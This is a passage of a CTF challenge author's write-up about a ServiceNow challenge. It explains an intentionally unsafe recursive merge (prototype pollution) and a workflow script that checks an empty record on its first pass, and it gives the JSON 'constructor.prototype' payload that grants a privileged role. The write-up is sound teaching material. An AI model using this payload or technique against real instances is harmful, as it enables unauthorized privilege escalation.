style=\"--0:#E1E4E8\">now.\u003C/span>\u003Cspan style=\"--0:#B392F0\">merge\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(form_data, current.variables);\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"var now = new global.ServiceNowObjectUtils();var form_data = {};now.merge(form_data, JSON.parse(current.variables.meta));now.merge(form_data, current.variables);\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>This creates a \u003Ccode>ServiceNowObjectUtils\u003C/code> object, which is also present in the Update Set. This is known as a Script Include, which is a reusable script that can be called from other scripts. The \u003Ccode>ServiceNowObjectUtils\u003C/code> script include is as follows:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> ServiceNowObjectUtils \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Class.\u003C/span>\u003Cspan style=\"--0:#B392F0\">create\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">ServiceNowObjectUtils\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">prototype\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#B392F0\">initialize\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> () {},\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#B392F0\">merge\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#FFAB70\">base\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">obj\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">isObject\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">obj\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">      \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">typeof\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> obj \u003C/span>\u003Cspan style=\"--0:#F97583\">===\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"object\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">||\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">typeof\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> obj \u003C/span>\u003Cspan style=\"--0:#F97583\">===\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"function\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;&#x26;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#B392F0\">String\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(obj.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">constructor\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.name).\u003C/span>\u003Cspan style=\"--0:#B392F0\">startsWith\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Glide\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> key \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> obj) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">      \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#B392F0\">isObject\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(base[key]) \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">isObject\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(obj[key])) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF\">this\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.\u003C/span>\u003Cspan style=\"--0:#B392F0\">merge\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(base[key], obj[key]);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">} \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (key \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> base) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">continue\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">} \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">          \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">obj[key].\u003C/span>\u003Cspan style=\"--0:#79B8FF\">constructor\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;&#x26;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">          \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">obj[key].\u003C/span>\u003Cspan style=\"--0:#79B8FF\">constructor\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.name.\u003C/span>\u003Cspan style=\"--0:#B392F0\">startsWith\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Glide\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">          \u003C/span>\u003Cspan style=\"--0:#99A0A6\">// To normalize special Glide Objects that can't be traversed\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">          \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">base[key] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> obj[key].\u003C/span>\u003Cspan style=\"--0:#B392F0\">toString\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">} \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">          \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">base[key] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> obj[key];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> base;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">},\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">type: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"ServiceNowObjectUtils\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">};\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"var ServiceNowObjectUtils = Class.create();ServiceNowObjectUtils.prototype = {  initialize: function () {},  merge: function (base, obj) {    function isObject(obj) {      return (        (typeof obj === &#x22;object&#x22; || typeof obj === &#x22;function&#x22;) &#x26;&#x26;        !String(obj.constructor.name).startsWith(&#x22;Glide&#x22;)      );    }    for (var key in obj) {      if (isObject(base[key]) &#x26;&#x26; isObject(obj[key])) {        this.merge(base[key], obj[key]);      } else if (key in base) {        continue;      } else {        if (          obj[key].constructor &#x26;&#x26;          obj[key].constructor.name.startsWith(&#x22;Glide&#x22;)        ) {          // To normalize special Glide Objects that can&#x27;t be traversed          base[key] = obj[key].toString();        } else {          base[key] = obj[key];        }      }    }    return base;  },  type: &#x22;ServiceNowObjectUtils&#x22;,};\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Taking a look at this, one should note that this is a classic case of an unsafe recursive object merge. This is a common vulnerability in javascript, and is known as Prototype Pollution. The \u003Ccode>merge\u003C/code> function is recursive, and will merge objects together. However, if the object being merged has a prototype property, it will be copied over to the base object. This can be used to overwrite properties on the base object, and can be used to overwrite properties on the base \u003Ccode>{}\u003C/code> object.\u003C/p>\n\u003Cp>The next issue is in the actual \u003Ccode>Administrator\u003C/code> script:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> GlideRecordUtil \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> global.\u003C/span>\u003Cspan style=\"--0:#B392F0\">GlideRecordUtil\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> RoleModUtils \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> global.\u003C/span>\u003Cspan style=\"--0:#B392F0\">RoleModUtils\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> gr \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">GlideRecord\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"sys_user_has_role\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">gr.\u003C/span>\u003Cspan style=\"--0:#B392F0\">addQuery\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"role\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"2831a114c611228501d4ea6c309d626d\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">); \u003C/span>\u003Cspan style=\"--0:#99A0A6\">// admin\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">gr.\u003C/span>\u003Cspan style=\"--0:#B392F0\">query\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">do\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> user_role_obj \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {};\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">GlideRecordUtil.\u003C/span>\u003Cspan style=\"--0:#B392F0\">populateFromGR\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(user_role_obj, gr);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (user_role_obj.user \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> current.opened_by) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">RoleModUtils.\u003C/span>\u003Cspan style=\"--0:#B392F0\">addRole\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(current.opened_by, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"c60206c2c30602102a53fdec05013190\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">workflow.scratchpad.admin_message \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"lgtm, added flag_holder role\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">true\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">} \u003C/span>\u003Cspan style=\"--0:#F97583\">while\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (gr.\u003C/span>\u003Cspan style=\"--0:#B392F0\">next\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">());\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"var GlideRecordUtil = new global.GlideRecordUtil();var RoleModUtils = new global.RoleModUtils();var gr = new GlideRecord(&#x22;sys_user_has_role&#x22;);gr.addQuery(&#x22;role&#x22;, &#x22;2831a114c611228501d4ea6c309d626d&#x22;); // admingr.query();do {  var user_role_obj = {};  GlideRecordUtil.populateFromGR(user_role_obj, gr);  if (user_role_obj.user == current.opened_by) {    RoleModUtils.addRole(current.opened_by, &#x22;c60206c2c30602102a53fdec05013190&#x22;);    workflow.scratchpad.admin_message = &#x22;lgtm, added flag_holder role&#x22;;    return true;  }} while (gr.next());\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Its a very subtle issue, but if we look at the \u003Ccode>GlideRecord\u003C/code> documentation, we need to actually call \u003Ccode>gr.next()\u003C/code> first to get the first record queried. The subtle issue here is that in the first loop iteration, we are going to be referencing an empty object. We can use this to our advantage, combined with the prototype pollution vulnerability.\u003C/p>\n\u003Cp>The solution here is to pass the following from the client as the “meta” variable.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"json\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">{\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">\"time\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"5/15/2024, 1:54:18 AM\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">\"submitter\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"--sys-id--\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">\"submitterName\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"System Administrator\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">\"constructor\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">\"prototype\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">      \u003C/span>\u003Cspan style=\"--0:#79B8FF\">\"user\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"--sys-id--\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"{  &#x22;time&#x22;: &#x22;5/15/2024, 1:54:18 AM&#x22;,  &#x22;submitter&#x22;: &#x22;--sys-id--&#x22;,  &#x22;submitterName&#x22;: &#x22;System Administrator&#x22;,  &#x22;constructor&#x22;: {    &#x22;prototype&#x22;: {      &#x22;user&#x22;: &#x22;--sys-id--&#x22;    }  }}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Ch3 id=\"notes-3\">\u003Ca href=\"#notes-3\">Notes\u003C/a>\u003C/h3>\n\u003Cp>This challenge ended up being much harder than expected, with only 1 solve. This was my mistake, I should have definately provided more information about the ServiceNow platform from the start as well are various references as to how to access records in the platform.\u003C/p>\n\u003Cp>The one team who solved it, \u003Ccode>000\u003C/code>, seemed to solve it in this general pattern as well, by starting off noticing the unsafe merge merge code in \u003Ccode>ServiceNowObjectUtils\u003C/code>, and then noticing that the \u003Ccode>populateFromGR\u003C/code> record was returning an empty object for the record. Its definately extremely extremely hard to solve this without setting up your own PDI, so I should have provided more information on how to do this as well.\u003C/p>\n\u003Cp>But overall this was extremely impressive by \u003Ccode>000\u003C/code>, and I had seen a few other challengers get extremely close as well.\u003C/p>\n\u003Cp>Another thing that did trip some users who got this far up, is that the ServiceNow server is running on Rhino1.7R5. People who tried to do prototype pollution using \u003Ccode>__proto__\u003C/code> had quit early when it didn’t work, but this was due to this Javascript runtime not supporting \u003Ccode>__proto__\u003C/code>. There were people who were soooooo close, but got stuck here. I hope people learned alot though about this platform, and it was hopefully a good (maybe just interesting) change of pace :).\u003C/p>\n\u003Ch3 id=\"references-3\">\u003Ca href=\"#references-3\">References\u003C/a>\u003C/h3>\n\u003Cul>\n\u003Cli>\u003Ca href=\"https://developer.servicenow.com/dev.do#!/learn/learning-plans/utah/new_to_servicenow/app_store_learnv2_buildmyfirstapp_utah_personal_developer_instances\">https://developer.servicenow.com/dev.do#!/learn/learning-plans/utah/new_to_servicenow/app_store_learnv2_buildmyfirstapp_utah_personal_developer_instances\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://docs.servicenow.com/bundle/utah-it-service-management/page/product/site-reliability-ops/task/sro-update-set-quick-start.html\">https://docs.servicenow.com/bundle/utah-it-service-management/page/product/site-reliability-ops/task/sro-update-set-quick-start.html\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://developer.servicenow.com/blog.do?p=/post/training-scriptsbg/\">https://developer.servicenow.com/blog.do?p=/post/training-scriptsbg/\u003C/a>\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"conclusion\">\u003Ca href=\"#conclusion\">Conclusion\u003C/a>\u003C/h2>\n\u003Cp>This was a fun CTF to organize, and I hope everyone enjoyed it. I know we had some issues in the beginning (ahem ahem rip infra), but I hope people enjoyed these challenges and thought they were unique / interesting. 